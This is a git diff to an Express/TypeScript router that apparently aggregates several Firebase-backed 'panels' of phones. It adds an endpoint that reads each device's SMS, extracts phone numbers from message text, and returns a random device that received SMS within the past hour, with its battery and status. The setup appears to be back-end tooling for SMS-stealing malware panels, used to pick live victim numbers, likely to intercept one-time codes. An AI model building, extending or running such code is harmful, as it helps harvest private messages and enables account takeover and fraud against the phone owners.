@@ -1,7 +1,14 @@
 import { Router, type IRouter } from "express";
 import { db, panelsTable } from "@workspace/db";
 import { eq } from "drizzle-orm";
-import { fetchPanelDevices } from "../lib/firebase";
+import {
+  extractPhoneFromSms,
+  fetchDeviceSms,
+  fetchPanelDevices,
+  getLatestSmsTimestamp,
+  type FirebaseDevice,
+  type FirebaseSmsMessage,
+} from "../lib/firebase";
 import { notifyBulkPanelsAdded, notifyNewPanel } from "../lib/notifications";
 import {
   CreatePanelBody,
@@ -10,6 +17,7 @@ import {
 } from "@workspace/api-zod";
 
 const router: IRouter = Router();
+const ADMIN_RANDOM_PANEL_TIMEOUT_MS = 6000;
 
 function normalizeFirebaseUrl(url: string): string {
   return url.trim().replace(/\/+$/, "").toLowerCase();
@@ -18,6 +26,15 @@ function normalizeFirebaseUrl(url: string): string {
 async function notifyPanelDevices(panel: typeof panelsTable.$inferSelect): Promise<void> {
   const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
   await notifyNewPanel(panel.name, devices);
+}
+
+async function fetchPanelDevicesForAdmin(
+  panel: typeof panelsTable.$inferSelect,
+): Promise<FirebaseDevice[]> {
+  return Promise.race([
+    fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name),
+    new Promise<FirebaseDevice[]>((resolve) => setTimeout(() => resolve([]), ADMIN_RANDOM_PANEL_TIMEOUT_MS)),
+  ]);
 }
 
 router.get("/panels", async (_req, res): Promise<void> => {
@@ -143,6 +160,57 @@ router.post("/panels/bulk", async (req, res): Promise<void> => {
 router.delete("/panels", async (_req, res): Promise<void> => {
   const deleted = await db.delete(panelsTable).returning({ id: panelsTable.id });
   res.json({ deleted: deleted.length });
+});
+
+router.get("/panels/random-number", async (_req, res): Promise<void> => {
+  const panels = await db.select().from(panelsTable).orderBy(panelsTable.createdAt);
+  const oneHourAgo = Date.now() - 60 * 60 * 1000;
+
+  const perPanel = await Promise.allSettled(
+    panels.map(async (panel) => {
+      const devices = await fetchPanelDevicesForAdmin(panel);
+      const eligible: FirebaseDevice[] = [];
+
+      for (const device of devices.filter((item) => item.status)) {
+        let latestSmsTimestamp = device.lastSmsTimestampMs;
+        let messages: FirebaseSmsMessage[] = [];
+
+        if (latestSmsTimestamp === null) {
+          messages = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, device.id);
+          latestSmsTimestamp = getLatestSmsTimestamp(messages);
+        }
+
+        if (latestSmsTimestamp !== null && latestSmsTimestamp >= oneHourAgo) {
+          if (!device.phoneNumber || device.phoneNumber === "—") {
+            if (!messages.length) messages = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, device.id);
+            device.phoneNumber = extractPhoneFromSms(messages) || device.phoneNumber;
+          }
+          eligible.push(device);
+        }
+      }
+
+      return eligible;
+    }),
+  );
+
+  const activeDevices = perPanel.flatMap((result) => result.status === "fulfilled" ? result.value : []);
+  if (!activeDevices.length) {
+    res.status(404).json({ error: "No active numbers available" });
+    return;
+  }
+
+  const device = activeDevices[Math.floor(Math.random() * activeDevices.length)];
+  res.json({
+    deviceId: device.id,
+    number: device.phoneNumber && device.phoneNumber !== "—" ? device.phoneNumber : null,
+    deviceName: device.name || device.model || device.id,
+    panelId: device.panelId,
+    panelName: device.panelName,
+    status: device.status ? "online" : "offline",
+    battery: device.battery || "—",
+    totalSms: device.totalSms,
+    lastSeen: device.lastSeen,
+  });
 });
 
 router.delete("/panels/:id", async (req, res): Promise<void> => {
